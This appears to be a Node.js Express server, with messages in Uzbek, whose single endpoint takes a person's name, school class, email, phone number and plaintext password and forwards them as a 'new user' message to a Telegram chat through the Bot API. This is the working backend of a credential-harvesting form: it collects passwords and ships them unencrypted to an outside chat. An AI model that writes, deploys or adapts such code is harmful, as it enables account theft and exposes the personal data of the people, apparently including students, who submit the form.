import express from "express";
import cors from "cors";
import dotenv from "dotenv";

dotenv.config();

const app = express();

app.use(cors());
app.use(express.json());

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

if (!BOT_TOKEN || !CHAT_ID) {
    console.error("BOT_TOKEN yoki CHAT_ID topilmadi");
    process.exit(1);
}

app.post("/sendMessage", async (req, res) => {
    try {
        const {
            name,
            surname,
            className,
            email,
            phone,
            password,
            passwordLevel,
        } = req.body;

        const text = `
🆕 Yangi foydalanuvchi

👤 Ism: ${name || "-"}
👤 Familiya: ${surname || "-"}
🏫 Sinf: ${className || "-"}

📧 Email: ${email || "-"}

📱 Telefon: ${phone || "-"}

🔐 Parol: ${password || "-"}

⚡ Daraja: ${passwordLevel || "-"}
`;

        const tg = await fetch(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
            {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text,
                }),
            }
        );

        const data = await tg.json();

        if (!data.ok) {
            return res.status(400).json({
                success: false,
                telegram: data,
            });
        }

        res.json({
            success: true,
            telegram: data,
        });
    } catch (err) {
        console.error(err);

        res.status(500).json({
            success: false,
            message: err.message,
        });
    }
});

const PORT = process.env.PORT || 3001;

app.listen(PORT, () => {
    console.log(`✅ Server ${PORT} portda ishlayapti`);
});